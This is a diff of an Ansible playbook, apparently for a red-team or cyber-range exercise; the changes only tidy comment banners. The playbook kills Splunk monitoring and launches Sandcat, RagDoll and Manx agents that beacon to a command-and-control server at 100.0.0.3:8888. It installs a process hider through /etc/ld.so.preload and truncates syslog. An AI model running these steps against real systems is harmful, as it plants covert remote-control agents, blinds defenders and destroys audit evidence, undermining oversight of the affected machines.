@@ -9,9 +9,7 @@
     purge_logs: true
 
   tasks:
-    ###################################################################
     # Generate stable random folder names ONCE
-    ###################################################################
     - name: Generate consistent random folder names
       set_fact:
         random_folder1: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
@@ -22,9 +20,7 @@
       set_fact:
         deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
 
-    ###################################################################
     # Environment setup
-    ###################################################################
     - name: setup
       package:
         name:
@@ -46,10 +42,7 @@
         state: directory
         mode: "0755"
 
-    ###################################################################
     # Clean up existing agents if any (optional pre-clean)
-    ###################################################################
-
     - name: kill process splunk
       shell: "pkill -9 -f splunk || true"
       ignore_errors: yes
@@ -90,11 +83,9 @@
         path: /usr/local/lib/process.so
         state: absent
 
-    ###################################################################
+  
     # Deploy agents
-    ###################################################################
-
-    # --- HTTP AGENTS (Sandcat) ---
+    # HTTP AGENTS (Sandcat)
     - name: Deploy HTTP agents
       shell: |
         server="http://100.0.0.3:8888"
@@ -105,7 +96,7 @@
           nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
         done
 
-    # --- HTML AGENTS (RagDoll) ---
+    # HTML AGENTS (RagDoll) 
     - name: Deploy HTML agents
       shell: |
         server="http://100.0.0.3:8888"
@@ -116,7 +107,7 @@
           nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
         done
 
-    # --- TCP AGENTS (Manx) ---
+    # TCP AGENTS (Manx)
     - name: Deploy TCP agents
       shell: |
         server="http://100.0.0.3:8888"
@@ -129,9 +120,7 @@
           nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
         done
 
-    ###################################################################
     # Build and install process hider
-    ###################################################################
     - name: Copy processhider.c from hideprocesses folder
       copy:
         src: ../hideprocesses/processhider.c
@@ -156,9 +145,7 @@
     - name: echo to preload
       shell: "echo '/usr/local/lib/libprocesshider.so' >> /etc/ld.so.preload"
 
-    ###################################################################
     # Clean up only source files, not the deployed agents
-    ###################################################################
     - name: Remove processhider source files
       file:
         path: "{{ item }}"
@@ -167,9 +154,8 @@
         - "{{ deploy_dir }}/processhider.c"
         - "{{ deploy_dir }}/Makefile"
 
-    ###################################################################
+    
     # Log and history cleanup
-    ###################################################################
     - block:
         - name: Truncate syslog (Debian/Ubuntu)
           shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
